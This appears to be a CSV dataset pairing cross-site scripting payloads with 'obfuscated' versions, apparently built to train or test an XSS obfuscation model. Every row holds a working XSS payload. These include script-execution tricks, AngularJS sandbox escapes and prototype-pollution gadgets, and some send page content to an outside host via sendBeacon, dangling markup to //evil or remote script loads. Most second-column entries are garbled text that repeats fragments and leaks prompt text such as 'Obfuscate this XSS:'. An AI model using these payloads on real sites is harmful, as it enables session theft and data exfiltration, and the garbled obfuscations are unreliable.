original,ofuscado
"<input type=""file"" id=""fileinput"" /><script>const fileinput = document.getelementbyid('fileinput');const datatransfer = new datatransfer();const file = new file(['hello world!'], 'hello.txt', {type: 'text/plain'});datatransfer.items.add(file);fileinput.files = datatransfer.files</script>","this XSS: input type=""file"" id=""fileinput"" />script>const fileinput = document.getelementbyid('fileinput');const datatransfer = new datatransfer();const file = new file(['hello world!'], 'hello.txt', type: 'text/plain');datatransfer.items.add(file);fileinput"
"<body onunload=navigator.sendbeacon('//ssl.portswigger-labs.net/',document.body.innerhtml)>",":body onunload=navigator.sendbeacon('///ssl.portswigger-labs.net/',document.body.innerhtml)>.body onunload=navigator.sendbeacon('///ssl.portswigger-labs.net/',document.body.innerhtml>> .body.innerhtml>.body onunload=navigator.sendbea"
"<img referrerpolicy=""no-referrer"" src=""//portswigger-labs.net"">","c=""//portswigger-labs.net"">: img referrerpolicy=""no-referrer"" src=""//portswigger-labs.net"">"
"<xss onkeypress=""alert(1)"" contenteditable style=display:block>test</xss>","as xss on-keypress=""alert(1)"" contenteditable style=display:block>test/xss>"
"<title><img title=""</title><img src onerror=alert(1)>""></title>",":: title>img title=""/title>img src onerror=alert(1)>"">/title>"
<div style=xss:expression(alert(1))> <div style=xss:expression(1)-alert(1)> <div style=xss:expressio\6e(alert(1))> <div style=xss:expressio\006e(alert(1))> <div style=xss:expressio\00006e(alert(1))> <div style=xss:expressio\6e(alert(1))> <div style=xss:expressio&#x5c;6e(alert(1))>,s:expressio006e(alert(1))> div style=xss:expressio00006e(alert(1))> div style=xss:expressio00006e(alert(1))> div style=xss:expressio006e(alert(1))> div style=xss:expressio00006e(alert(1))
"<img/src/style=transition:0.1s onerror=""window.ontransitionstart=settimeout;this.style.opacity=0;event.prototype.tostring=x=>'alert\x281\x29'"">","- ,=x=>'alertx281x29'"">>alertx281x29'"">"
"<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>you must click me</font></a><base target=""","/font>/a>base target="">/font"">base target="">>a: a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html>font size=100 color=red>you must click me/font>/a>base target=""> aa href=http://subdomain1.portswigger-lab"
"<video><source src=""//evil?","Obfuscate this XSS: video>source src=""//evil?"
';frames[/al/.source+/ert/.source](/xss/.source);//,=] for this: ';frames[/al/.source+/ert/.source](/xss/.source);///.source);///.source_>.oblicate this XSS: ';frames[/al/.source+/ert/.source](/xss/.source);/// xss/.source);///.source;/// xss/.source;//
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style=""position:absolute;"" onanimationcancel=""print()""></xss>",";/style>xss id=x style=""position:absolute;"" onanimationcancel=""print()"">/xss>/xss>tinyurl=""print()"">/xss>/xss>/xss>/xss>/xss>/znbsp;:target animation:10s ease-in-out 0s 1 x;"
<body onpopstate=print()>,this XSS: body onpopstate=print()>
"<meta http-equiv=""refresh"" content=""0; http://evil?","this XSS: meta http-equiv=""refresh"" content=""0; http://evil?"
"<script>object.prototype.url = 'data:,alert(1)//'</script><script>$.getscript('https://google.com/')</script>","s: 'data:,alert(1)//'/script>script>$.getscript('http://google.com/'/script>script>$.getscript('http://google.com/'/script>script>$.getscript('http://google.com/'/script>>$.getscript('http://google.com/'/script> 'data:,alert"
"<svg onload=onerror=eval;new'""-alert\x281\x29//'>","svg onload=onerror=eval;new'""-alertx281x29//'>"
"<svg onload=""throw top.onerror=eval,{linenumber:1,columnnumber:1,filename:1,message:'/*'+url}"">","name:1,message:'/*'+url"">.obfuscate this XSS: svg onload=""throw top.onerror=eval,linenumber:1,columnnumber:1,filename:1,message:'/*'+url"">.>>>>"
<xss onpointerout=alert(1) style=display:block>xss</xss>,? XSS: xss onpointerout=alert(1) style=display:block>xss/xss> xss XSS: xss onpointerout=alert(1) style=display:block>xss/xss>
<p v-=_c.constructor`alert(1)`()>,.c.constructoralert(1)()>
<img src=x onerror=location=atob`amf2yxnjcmlwddphbgvydchkb2n1bwvudc5kb21haw4p`>,rc=x onerror=location=atobamf2yxnjcmlwddphbgvydchkb2n1bwvudc5kb21haw4p>
{{$el.ownerdocument.defaultview.alert(1)}},>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> $el.ownerdocument.defaultview.alert(1)
<audio controls loop muted autoplay onwaiting=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>,audio.mp3 type=audio/mpeg>/audio>
"<body onpageswap=navigator.sendbeacon('//ssl.portswigger-labs.net/',document.body.innerhtml)>","s-sdocument.body.innerhtml)>body onpageswap=navigator.sendbeacon('///ssl.portswigger-labs.net/',document.body.innerhtml>,document.body.innerhtml> XSS: body onpageswap=navigator.sendbeacon('//ssl.portswigger-labs.net/',"
<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>,dia.mp3 type=audio/mpeg>/audio> audio controls ondurationchange=alert(1)>source src=validaudio.mp3 type=audio/mpeg>/audio>
"<div draggable=""true"" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss>",">drop here/xss>xss>/ XSS:essstruct XSS this XSS: this XSS: div draggable=""true"" contenteditable>drag me/div>xss ondrop=alert(1) contenteditable style=display:block>drop here/xss>"
"<meta http-equiv=""content-type"" content=""text/html; charset=utf-7"" /> +adw-script+ad4-alert(1)+adw-/script+ad4-","XSS: meta http-equiv=""content-type"" content=""text/html; chart=utf-7"" /> +adw-script+ad4-alert(1)+adw-/script+ad4-alert(1)+adw-/script+ad4-alert(1)+adw-/script+ad4-alert+adw-/script+ad4-alert(1)"
+/v8 +adw-script+ad4-alert(1)+adw-/script+ad4-,: +/v8 +adw-script+ad4-alert(1)+adw-/script+ad4-alert(1)+adw-/script+ad4-
<script>object.prototype.onload = 'alert(1)'</script>,Obfuscate this XSS: script>object.prototype.onload = 'alert(1)'/script>object.prototype.onload = 'alert(1)'/script>Object.prototype.onload = 'alert(1)'/script>object.prototype.onload = 'alert(1)'/script>object.prototype.onload = 'alert(1)'/script>
<img src @error=this.alert(1)>,: img src @error=this.alert(1)>
<xss onpointerup=alert(1) style=display:block>xss</xss>,=display:block>xss/xss> This is XSS: xss onpointerup=alert(1) style=display:block>xss/xss>
"<body onload=""throw onerror=eval,{linenumber:1,columnnumber:1,filename:1,message:'/*'+location}"">","Obfuscate this XSS: body onload=""throw onerror=eval,linenumber:1,columnnumber:1,filename:1,message:'/*'+location"">>body onload=""throw onerror=eval,linenumber:1,columnnumber:1,filename:1,message:'/*'+location"">>>>>>>>>>>>>>>>>"
{{_c.constructor('alert(1)')()}},('alert(1)')()_c.constructor('alert(1)')() _m.constructor('alert(1)'
';this['\141\154\145\162\164']('\130\123\123');//,Obfuscate this XSS: ';this['141154145162164']('130123123');//////
"<xss oncopy=alert(1) value=""xss"" autofocus tabindex=1 style=display:block>test","=alert(1) value=""xss"" autofocus tabindex=1 style=display:block>test:"
<script>onerror=alert;throw 1</script>,r. XSS: script>onerror=alert;throw 1/script>
<script>object.prototype['*'] = ['onload']</script><script>document.write(sanitizehtml('<iframe onload=alert(1)>'))</script>,"this XSS: ""object.prototype['*'] = ['onload']/script>script>document.write(sanitizehtml('iframe onload=alert(1)>'))/script>script>document.write(sanitizehtml('iframe onload=alert(1)>'))/script>script>document.write(sanitizehtml('iframe onload=a"
"<script>throw/x/,onerror=uncaught=eval,h=location.hash,e=error,e.linenumber=e.columnnumber=e.filename=e.message=h[2]+h[1]+h,!!window.installtrigger?e:e.message</script>","throw: x:e.message/script>throw/x/,onerror=uncaught=eval,h=location.hash,e=error,e.linenumber=e.columnnumber=e.filename=e.message=h[2]+h[1]+h,!!window.installtrigger?e:e.message/script>throw/x/,onerror=uncaught=e"
"<script>{onerror=eval}throw{linenumber:1,columnnumber:1,filename:1,message:'alert\x281\x29'}</script>","onerror=evalthrowlinenumber:1,columnnumber:1,filename:1,message:'alertx281x29'/script> *onerror=evalthrowlinenumber:1,columnnumber:1,filename:1,message:'alertx281x29'/script>"
<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>,s;&lt;&sol;script&gt;/iframe>/iframe>/iframe> = iframe> iframe>/iframe>> iframe> iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;>/iframe>
<body ontouchend=alert(1)>,: body ontouchend=alert(1)>
<xss onfocus=alert(1) autofocus tabindex=1>,XSS: xss onfocus=alert(1) autofocus tabindex=1> Autofocus tabindex=1> autofocus tabindex=1> autofocus tabindex=1> autofocus tabindex=1> at XSS: xss onfocus=alert(1) autofocus tabindex=1> at XSS: | xss onfocus=alert(1) autofocus tabindex=1>
<img src @error=e=$event.path.pop().alert(1)>,: img src @error=e=$event.path.pop().alert(1)>
';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);//,Obfuscate this XSS: ';this[/*foo*/'alert'/*bar*/](this[/*foo*/'document'/*bar*/]['domain']);////////////////////////////////////////1///////'//////////
<script>eval('\x61lert(1)')</script>,: script>eval('x61lert(1)')/script> XSS: script>eval('x61lert(1)')/script>
<script>var{haha:onerror=alert}=0;throw 1</script>,XSS: script>varhaha:onerror=alert=0;throw 1/script>
<xss onsecuritypolicyviolation=alert(1)>xss</xss>,ss is on a securitypolicyviolation=alert(1)>xss/xss>>xss/xss>>xss>xss>0=prt=e7: xss onsecuritypolicyviolation=alert(1)>xss/xss>xss/xss>xss>xss>xss>xss XSS:xss
<form><button formaction=//evil>xss</button><textarea name=x>,-textarea name=x> = x>
<p :=_c.constructor`alert(1)`()>,: p :=_c.constructoralert(1)()>
"<noembed><img title=""</noembed><img src onerror=alert(1)>""></noembed>","the XSS: noembed>img title=""/noembed>img src onerror=alert(1)>"">/noembed>"
{{_b.constructor`alert(1)`()}},()_b.constructoralert(1)()()
<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>,: video onfullscreenchange=alert(1) src=validvideo.mp4 controls>
"<base href=""javascript:/a/-alert(1)///////""><a href=../lol/safari.html>test</a>",////>a href=../lol/safari.html>test/a> test/a>test/a>test/a>test/a>test/a>test/a>test/a>test/a>test/a>test/a>test/a>test/a>test/a>test/a>test/a>test/a>test
<script>var{a:onerror}={a:alert};throw 1</script>,this XSS: script>vara:onerror=a:alert;throw 1/script>
';this[/al/.source+/ert/.source](/xss/.source);//,Obfuscate this XSS: ';this[/al/.source+/ert/.source](/xss/.source);////.source;////// xss/.source)(/xss/.source);///////sippl/ xss/.source);///sippl/ xss/.source);///xss/.source;//
<script>alert`1`</script>,Obfuscate this XSS: script>alert1/script>
"<object data=""javascript:alert(1)"">",": object data=""javascript:alert(1)"">"
"{{ c=''.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=({}).tostring; c=c.$apply(c);$root.$$phase=op;$root.$digest=od; b=c(b,c,b);$evalasync("" astnode=pop();astnode.type='unaryexpression'; astnode.operator='(window.x?void0:(window.x=true,alert(1)))+'; astnode.argument={type:'identifier',name:'foo'}; ""); m1=b($$asyncqueue.pop().expression,null,$root); m2=b(c,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a; }}","?'.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$phase; $root.$phase=null;od=$root.$digest=od; b=c(b,c,b);$evalasync("" astnode=pop();astno"
"<form><input type=submit value=""xss"" style=""width:100%;height:100%"" type=submit formaction=""//evil?","%"" type=submit formaction=""//evil?"
"<!-- ><img title=""--><iframe/onload=alert(1)>""> --> <!-- ><img title=""--><iframe/onload=alert(1)>""> -->",": !-- >img title=""-->iframe/onload=alert(1)>""> --> !-- >img title=""-->iframe/onload=alert(1)>""> --> !-- >img title=""-->iframe/onload=alert(1)>""> --> !-- >img title=""-->iframe/onload=a"
"{}."")));alert(1)//"";","(("")),alert(1)//"";"
"<iframe id=target></iframe><script>target.src='xss.php?x=<img/src/onerror=onmessage=settimeout;event.prototype.tostring=rangeerror.prototype.tostring;event.prototype.name=""alert\x281\x29"">';target.onload=settimeout(function(){frames[0].postmessage("""", ""*"")},100)</script>",",100)/script>target.src='xss.php?x=img/src/onerror=onmessage=settimeout;event.prototype.tostring=rangeerror.prototype.tostring=settimeout;event.prototype.tostring=rangeerror.prototype.tostring=settimeout(function()frames[0].postmessage("""", ""*""),100"
"<xss onmousemove=""alert(1)"" style=display:block>test</xss>","Obfuscate this XSS: xss onmousemove=""alert(1)"" style=display:block>test/xss>"
"<embed src=""javascript:alert(1)"">",and use the XSS in order to find a solution.
"<div style=""-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)""> <div style=""\-\mo\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)""> <div style=""-moz-bindin\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)""> <div style=""-moz-bindin&#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)"">","--div style=""-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)""> div style=""-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)""> div style=""-moz-bindin67:url(/"
';window['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,’:window['u0061u006cu0065u0072u0074']('u0058u0053u0053u0053');////>еo;window['u0061u006cu0065u0072u0074']('u0058u
<xss onbeforescriptexecute=alert(1)><script>1</script>,Script>1: xss onbeforescriptexecute=alert(1)>script>1/script>1/script>1/script>
"<object data=""# alert(1)"" codebase=javascript://>",": object data=""# alert(1)"" codebase=javascript://>"
<svg><animate xlink:href=#xss attributename=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>xss</text></a>,n=xss>text x=20 y=20>xss/text>/a>/a>/a>/a>/a>/a>/a>/a>/a>/a>/a>/a>/a>/a>/a>/a>/a>/a>/a>/a>/a>/a>
"';frames['\x65\x76\x61\x6c']('frames[""\x61\x6c\x65\x72\x74""](frames[""\x61\x74\x6f\x62""](""wfnt""))');//","x65x76x61x6c']('frames[""x61x6cx65x72x74""](""wfnt""))');///frames['x65x76x61x6c']('frames[""x61x64x62""](""wfnt""))')');///frames['x65x"
';globalthis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,';globalthis[(++[])[+!![]]+(![]+[])[!+[]+!![])[!+[]+!![])[+!![]]]+(!![]+[]])[+!![]]+(!![]+[]])((++[]]]]+(+!![]]]);///(+!![]]+[]
"<xss oncut=alert(1) value=""xss"" autofocus tabindex=1 style=display:block>test","” autofocus tabindex=1 style=display:block>test this XSS: xss oncut=alert(1) value=""xss"" autofocus tabindex=1 style=display:block>test this XSS: xss oncut=alert(1) value=""xss"" autofocus tabindex=1 style=display:block>test this XSS: xss oncut=alert(1) value=""xss"""
"<x title""=""&lt;iframe&tab;onload&tab;=alert(1)&gt;"">",":x title""=""&lt;iframe&tab;onload&tab;=alert(1)&gt;"">"
<script>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])</script>,[
<script>object.prototype.attrs = {src:1};object.prototype.src='https://portswigger-labs.net/xss/xss.js'</script>,object.prototype.attrs = src:1;object.prototype.src='http://portswigger-labs.net/xss/xss.js'/script>object.prototype.attrs = src:1;object.prototype.src='http://portswigger-labs.net/xss/xss.js'
{{$on.constructor('alert(1)')()}},)()/.$on.constructor('alert(1)')()/$on.constructor('alert(1)')()/$on.constructor('alert(1)')()/$on.constructor('alert(1)')()/#$on.constructor('alert(1)')()
